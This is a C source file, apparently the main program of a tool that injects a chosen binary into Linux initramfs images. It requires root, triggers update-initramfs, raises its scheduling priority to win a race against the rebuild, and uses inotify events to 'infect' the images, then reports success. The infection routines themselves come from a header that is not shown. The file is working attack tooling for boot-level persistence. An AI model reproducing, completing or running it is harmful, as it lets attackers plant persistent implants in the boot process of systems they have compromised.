#define _GNU_SOURCE     /* Needed to get O_LARGEFILE definition */
#include <stdio.h>
#include <sys/inotify.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdlib.h>
#include <poll.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <limits.h>
#include <signal.h>

#include "banner.h"
#include "infect.h"

int slurp_file(char *filename)
{
	int rc = -1;
	int fd;
	struct stat buf;

	rc = open(filename, O_RDONLY);
	if (rc < 0) {
		perror("open");
		goto out;
	}
	fd = rc;
	rc = fstat(fd, &buf);
	if (rc < 0) {
		perror("stat");
		goto out;
	}
	exe.len = buf.st_size;
	exe.buf = (unsigned char*)malloc(exe.len);
	if (exe.buf == 0) {
		perror("malloc");
		goto out;
	}
	rc = read(fd, (void*)exe.buf, exe.len);
	if (rc != exe.len) {
		perror("read");
		goto out;
	}
	close(fd);

	rc = 0;

 out:
	return rc;
}

static void handle_usr1(int signum)
{
	printf("everything should be infected now.  Have a nice day\n");
	exit(EXIT_SUCCESS);
}


int main(int argc, char **argv)
{
	int rc;
	struct pollfd pollfds[1];
	struct sched_param sched = {
		.sched_priority = 1
	};
	pid_t update_pid;

	printf("%s\n", banner);
	if (getuid() != 0) {
		printf("you must run as root\n");
		exit(EXIT_FAILURE);
	}

	if (argc < 2) {
		printf("usage:\n\t%s: filename\n\nWhere filename is the binary to splat\n",
		       argv[0]);
		exit(EXIT_FAILURE);
	}
	rc = slurp_file(argv[1]);
	if (rc < 0) {
		printf("couldn't open file\n");
		exit(EXIT_FAILURE);
	}

	update_pid = fork();
	if (update_pid < 0) {
		perror("fork");
		exit(EXIT_FAILURE);
	} else if (update_pid == 0) {
		/* child */

		nice(10);
		sleep(1);

		printf("updating ramdisk images...\n");
		fflush(stdout);
		close(1);
		close(2);
		open("/dev/null", O_WRONLY);
		open("/dev/null", O_RDWR);

		system("sh -c 'update-initramfs -k all -u 2>&1 > /dev/null'");
		printf("done!\n");
		kill(getppid(), SIGUSR1);
		exit(EXIT_SUCCESS);
	}

	signal(SIGUSR1, handle_usr1);

	if (infect_init() < 0) {
		perror("could not initialize structure");
		exit(EXIT_FAILURE);
	}

	/* there's a race, and we're going to win it */
	rc = sched_setscheduler(getpid(),
				SCHED_FIFO | SCHED_RESET_ON_FORK,
				&sched);
	if (rc < 0) {
		perror("could not set scheduler policy");
		exit(EXIT_FAILURE);
	}

	pollfds[0].fd = infect_get_inotify_fd();
	pollfds[0].events = POLLIN | POLLNVAL;

	while (1) {
		rc = poll(pollfds, 1, 10);
		if (rc < 0) {
			perror("error in poll");
			exit(EXIT_FAILURE);
		} else if (rc == 0) {
			int status;
			pid_t pid;

			pid = waitpid(update_pid, &status, WNOHANG);
			if (pid < 0) {
				perror("waitpid");
				exit(EXIT_FAILURE);
			} else if (pid == update_pid) {
				printf("everything should be infected now.  Have a nice day\n");
				exit(EXIT_SUCCESS);
			}
		} else if (pollfds[0].revents & POLLIN) {
			/* Inotify events are available */
			infect_handle_inotify();
		}

	}
	return 0;
}

/*
 * Editor modelines  -  https://www.wireshark.org/tools/modelines.html
 *
 * Local variables:
 * c-basic-offset: 8
 * tab-width: 8
 * indent-tabs-mode: t
 * End:
 *
 * vi: set shiftwidth=8 tabstop=8 noexpandtab:
 * :indentSize=8:tabSize=8:noTabs=false:
 */
